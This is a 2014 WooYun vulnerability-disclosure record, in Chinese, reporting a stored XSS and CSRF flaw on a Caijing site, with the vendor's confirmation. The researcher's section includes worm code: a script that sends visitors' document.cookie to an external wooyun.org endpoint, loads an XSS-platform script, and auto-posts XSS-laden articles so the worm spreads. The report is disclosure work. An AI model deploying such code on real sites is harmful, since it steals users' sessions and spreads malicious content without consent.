{"id": 42935, "wybug_id": "wooyun-2014-084316", "wybug_title": "财经网某站XSS蠕虫", "wybug_corp": "财经网", "wybug_author": "Mr .LZH", "wybug_date": "2014-11-24 15:47", "wybug_open_date": "2015-01-08 15:48", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向公众公开  简要描述： 蠕虫=XSS+csrf合理给rank是对白帽子的肯定，给高rank是对白帽子的关照。最后给多少rank拭目以待。 详细说明：  地址：http://tnew.caijing.com.cn/先看发帖，直接post4个参数，无token验证，导致csrf漏洞。\n\n\n\n再看存储型XSS，帖子内容未过滤，导致XSS。\n\n\n\n接下来进入蠕虫意淫状态：——————————————————————————————如果在文章插入<script src='http://wooyun.org/test.js'>test.js内容为：\n//引入自动发帖,传播蠕虫jsdocument.write('<script src=\"http://wooyun.org/fatie.php?cookie='+document.cookie+'\"><\\/script>');//引入xss收信平台的js文件，如beefdocument.write('<script src=\"http://wooyun.org/xss.js\"><\\/script>');\n这样就会请求自动发帖的js和xss平台的js。用户访问时网页引入：http://wooyun.org/fatie.php?cookie=（cookie内容）fatie.php的内容大致可以是这样。\n网站cookie中cmstop_username存在用户名，从传输的cookie内容到数据库查询是否第一次中蠕虫，如果是第一次，把用户名写入数据库，防止中蠕虫后重复发帖。网站返回一个执行自动发帖的js动作。返回的js代码大致这样：//这里文章标题和内容可以用php采集入库，让每个蠕虫感染者发不同的文章继续感染别人var title = \"url编码后的标题内容\";var content = \"url编码后的带有xss代码的文章内容\";if (window.XMLHttpRequest) {  var x = new XMLHttpRequest();} else {  var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');  for(var n = 0; n < MSXML.length; n ++) {    try {        var objXMLHTTP = new ActiveXObject(MSXML[n]);        break;    } catch(e) {    }  }}objXMLHTTP.open(\"POST\", \"http://tnew.caijing.com.cn/Articles/add\", false);objXMLHTTP.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");objXMLHTTP.setRequestHeader(\"Connection\", \"Keep-Alive\");objXMLHTTP.send(\"title=\" + title + \"&content=\" + content + \"&g_name=%E5%90%90%E6%A7%BD&g_id=4&cate_id=23&cate_name=%E6%97%A0%E4%B8%BB%E9%A2%98\");这样就实现了xss的传播，而且通过不同人只发一个发不同帖子，实现xss蠕虫的隐蔽。\n至于xss.js,直接引入xss平台的就行。   漏洞证明：     修复方案：     版权声明：转载请注明来源 Mr .LZH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-28 18:39 厂商回复： 非常感谢 Mr .LZH同学的努力，希望继续帮助我们测试。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}